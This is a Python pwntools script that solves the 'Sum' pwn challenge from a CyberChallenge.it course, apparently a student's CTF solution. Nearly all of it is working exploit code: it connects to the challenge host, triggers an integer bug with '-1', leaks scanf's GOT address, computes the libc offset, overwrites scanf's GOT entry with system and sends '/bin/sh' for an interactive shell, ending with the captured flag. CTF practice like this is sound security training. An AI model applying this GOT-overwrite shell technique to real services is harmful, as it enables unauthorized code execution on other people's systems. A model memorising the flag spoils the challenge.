from pwn import *

exe = ELF("/home/alessio/Scrivania/tools/CTFs/CyberChallenge/Week 10/Sum/sum")
libc = ELF("/home/alessio/Scrivania/tools/CTFs/CyberChallenge/Week 10/Sum/libc-2.27.so")  # import libc file
context.binary = exe
HOST = "sum.challs.cyberchallenge.it"
PORT = 6014
p = remote(HOST, PORT)

print("\n[+] Exploiting...")
abs_scanf = 0x0017c4e0  # absolute address of scanf function
abs_system = 0x0014f440  # absolute address of system function
scanf_got = 787465  # address of function scanf in the GOT (Global Offset Table)

p.sendline(b"-1")  # Trigger the error to generate 18446744073709551615 values
p.recvuntil(">")
p.clean()
p.sendline(b"get " + str(scanf_got).encode())  # send the GOT address of function scanf

rel_scanf = int(p.recvline()[:-1])  # used to get the relative address on the server
log.info("Relative scanf -->  %s" % hex(rel_scanf))

offset = rel_scanf - abs_scanf  # I subtract the address for the absolute address to find the offset
log.info("Offset -->  %s" % hex(offset))

rel_system = offset + abs_system  # I add the offset to the absolute address of the system function to find the relative system address
log.info("Relative system -->  %s" % hex(rel_system))

# change the GOT address of scanf with relative address of system
p.sendline(b"set " + str(scanf_got).encode() + b" " + str(rel_system).encode())

p.sendline(b"/bin/sh")
p.interactive()

# FLAG --> CCIT{Sum from 35c3 Junior CTF - isZJ8skyvmZbM8vz}
